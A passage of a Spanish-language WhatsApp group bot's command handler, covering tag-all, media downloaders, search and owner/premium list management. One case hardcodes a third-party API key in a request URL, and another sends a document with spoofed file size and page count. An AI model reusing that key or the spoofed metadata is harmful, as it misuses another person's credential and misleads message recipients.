if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(`Miembro degradado ✓`)).catch((err) => reply(jsonformat(err)))
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Texto?`)
conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'tagall': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !itsMeHyzd) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!q) return reply(`Texto?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪〘 *Invocar al grupo* 〙✪══\n`
for (let mem of participants) {
teks += `➲ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return reply(`Ej: ${prefix + command} *txt*`)

let { eBinary } = require('./scrape/binary')
let eb = await eBinary(q)
reply(eb)
}
break
case 'dbinary': {
if (!q) return reply(`Ej: ${prefix + command} *txt*`)

let { dBinary } = require('./scrape/binary')
let db = await dBinary(q)
reply(db)
}
break
case 'tiktokvideo':{
if (!q) return reply(`Y el link???\nEj: ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)

let res = await tiktokdl(q)
conn.sendMessage(m.chat,{video:{url: res.media[1].url},caption: `${mess.succes}`},{quoted:m})
}
break
case 'tiktokaudio':{
if (!q) return reply(`Y el link???\nEj: ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)

let tytyd = await tiktokdl(q)
conn.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case 'googles': {
if (!q) return reply(`Ej : ${prefix + command} WhatsApp`)

let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Busqueda de Google de : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Titulo* : ${g.title}\n`
teks += `⭔ *Descripcion* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}
break
case 'happymod':{
if (!q) return reply(`Ej: ${prefix+command} Nombre de la app`)

let kat = await scp1.happymod(q)
reply(util.format(kat))
}
break
case 'search':
case 'song':
case 'audio':
case 'ytsearch':
if (args.length < 1) return reply(`Ej:\n${prefix+command} Joji - Ew`)

let list_rows = [];
const data = await yts(q);
for(let a of data.all) {
list_rows.push({
title: a.title, description: `Canal: ${a.author.name} | Duración: ${a.duration}`, rowId: `.play ${a.url}`
})
}
const buttonNya = {
text: `Resultados de búsqueda de ${q}`,
footer: `Toque el botón de abajo`,
buttonText: 'Tap',
sections: [{
title: "Resultado de búsqueda", 
rows: list_rows
}],
listType: 1
}
const sendMsg = await conn.sendMessage(from, buttonNya)
break
case 'play':{
if (!text) return reply(`Ej : ${prefix+command} Joji - Ew`)

let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(search.videos[0].thumbnail)
axios.get(`https://api.lolhuman.xyz/api/ytplay?apikey=BrunoSobrino&query=${text}`).then(({ data }) => {
let k = data.result
owned = '5493865402608@s.whatsapp.net'
ngen = `ᴛɪᴛᴜʟᴏ : 
${k.title}

ᴄᴀɴᴀʟ: 
${k.uploader}

ʟɪɴᴋ ᴄᴀɴᴀʟ:
${k.channel}

ᴅᴜʀᴀᴄɪᴏɴ:
${k.duration}

ᴠɪsᴛᴀs: 
${k.view}

ʟɪᴋᴇ:
${k.like}

ᴅɪsʟɪᴋᴇ
${k.dislike}

ᴅᴇsᴄʀɪᴘᴄɪᴏɴ:
${readmore}

${k.description}
`
let buttonse = [
{buttonId: `${prefix}mp4 ${url}`, buttonText: {displayText: `𝐕𝐢𝐝𝐞𝐨`}, type: 1},
{buttonId: `${prefix}mp3 ${url}`, buttonText: {displayText: `𝐀𝐮𝐝𝐢𝐨`}, type: 1}
]
let buttonMessages = {
document: fs.readFileSync('./media/fake.txt'),
mimetype: `application/octet-stream`,
fileName: `      𝗣𝗹𝗮𝘆 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 `,
fileLength: 99999999999999,
pageCount: 999999,
caption: ngen,
footer: `_Powered By @${owned.split("@")[0]}_`,
buttons: buttonse,
headerType: 4,
contextInfo:{externalAdReply: {
title: `${k.title}`,
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true,
body: ``,
thumbnail: eek,
"sourceUrl": 'https://github.com/Hyzdmod'
}}}
conn.sendMessage(m.chat, buttonMessages, { quoted: m})
})
}
break
case 'play2':
			if (args.length == 0) return await reply(`Ej: ${prefix + command} Joji - Ew`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${full_args}`)
				.then(({ data }) => {
					axios.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=https://www.youtube.com/watch?v=${data.result[0].videoId}`).then(({ data }) => {
						var caption = `❖ Titulo    : *${data.result.title}*\n`
						caption += `❖ Peso     : *${data.result.size}*`
						conn.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
							conn.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
						})
					})
				})
				.catch(console.error)
			break
		case 'ytmp3': case 'mp3':
			if (args.length == 0) return reply(`Ej: ${prefix + command} link de YouTube `)
			axios
				.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
						conn.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
					})
				.catch(console.error)
			break
		case 'ytmp4': case 'mp4':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
						conn.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', fileName: `${data.result.title}.mp4` })
					})
				.catch(console.error)
			break
case 'addprem':
if (!itsMeHyzd) return reply(mess.owner)
if (!args[0]) return reply(`Usa: ${prefix+command} numero\nEj: ${prefix+command} 5493865362492`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Error, El numero no esta registrado en WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`El numero ${prrkek} Ahora es Premium! ✓`)
break
case 'delprem':
if (!itsMeHyzd) return reply(mess.owner)
if (!args[0]) return reply(`Usa: ${prefix+command} numero\nEj: ${prefix+command} 5493865362492`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`El número ${ya} ya no es Premium!`)
break
case 'addvn':{
if (!itsMeHyzd) return reply(mess.owner)
if (args.length < 1) return reply('como se llama el audio')
if (vnnye.includes(q)) return reply("El nombre ya está en uso.")
let delb = await conn.downloadAndSaveMediaMessage(quoted)
vnnye.push(q)
await fsx.copy(delb, `./database/Audio/${q}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Éxito al agregar audio\nPara ver los audios usa ${prefix}listvn`)
}
break
case 'delvn':{
if (!itsMeHyzd) return reply(mess.owner)
if (args.length < 1) return reply('Introducir consulta')
if (!vnnye.includes(q)) return reply("El nombre no está en la base de datos.")
let wanu = vnnye.indexOf(q)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${q}.mp3`)
reply(`Se elimino ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *Lista de Audios* 」\n│\n'
for (let x of vnnye) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total : ${vnnye.length}*`
reply(teks)
}
break
case 'addowner':
if (!itsMeHyzd) return reply(mess.owner)
if (!args[0]) return reply(`Usa: ${prefix+command} numero\nEj: ${prefix+command} 5493865362492`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await conn.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Error, El numero no esta registrado en WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`El numero ${bnnd} fue agregado a moderadores!!!`)
break
case 'delowner':
if (!itsMeHyzd) return reply(mess.owner)
if (!args[0]) return reply(`Usa: ${prefix+command} numero\nEj: ${prefix+command} 5493865362492`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`El numero ${ya} fue eliminado de los mods!!!`)
break
case 'listpremium':
teks = '*Lista Premium*\n\n'
for (let conn of prem) {
teks += `- ${conn}\n`
}
teks += `\n*Total : ${prem.length}*`
conn.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setppbot': {
if (!itsMeHyzd) return reply(mess.owner)
if (!quoted) return reply(`Responde a una imagen con el comando ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Responde a una imagen con el comando ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Responde a una imagen con el comando ${prefix + command}`)
var medis = await conn.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == command) {
var { img } = await generateProfilePicture(medis)
await conn.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Listo`)
} else {
var memeg = await conn.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Listo`)
}
}
break
case 'lista':
case 'listnya':
if (!m.isGroup) return reply(mess.group)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
var arr_rows = [];
for (let x of db_respon_list) {
if (x.id === from) {
arr_rows.push({
title: x.key,
rowId: x.key
})
}
}
const listMessageNya = {
text: `Hola ${pushname}\n\n Aquí hay una lista de artículos\n Por favor elige uno!!!\n${tanggal(new Date())}\n🕰 Hora : ${moment.tz('America/Buenos_Aires').format('HH:mm:ss')}`,
footer: wm,
buttonText: "Click",
sections: [{
title: groupName, rows: arr_rows
}],
listType: 1
}
const sendMsge = await conn.sendMessage(from, listMessageNya)
break
case 'addlist':
if (!itsMeHyzd) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]    
if (!q.includes("@")) return reply(`Uso: ${prefix+command.slice(0)} *Nombre@Item*\n\n_Ej:_\n\n${prefix+command.slice(0)} Hyzd@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`Lista de respuesta con clave : *${args1}* ya en este grupo.`)
if (/image/.test(mime)) {
media = await conn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Sukses Add List Dengan Kunci : *${args1}*`)
}
break
case 'dellist':
if (!itsMeHyzd) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List Item dengan Nama *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sukses delete list message dengan key *${q}*`)
break
case 'updatelist':
if (!itsMeHyzd) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`Usa: ${command.slice(1)} *Nombre del artículo@Item*\n\n_Ej:_\n\n${command.slice(1)} Nombredelalista@List`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`perdon, la clave *${args1}* no esta registrado en este grupo`)
if (/image/.test(mime)) {
media = await conn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
updateResponList(from, args1, args2, true, `${mem}`, db_respon_list)
reply(`Actualizar correctamente el mensaje de la lista con la clave : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Actualice con éxito la lista de respuestas con la clave *${args1}*`)
}
break
case 'snobg': {
if (!quoted) return reply(`Responde a una foto con el comando ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await conn.downloadAndSaveMediaMessage(quoted)
let encmedia = await conn.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Responde a una foto con el comando ${prefix+command}`)
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
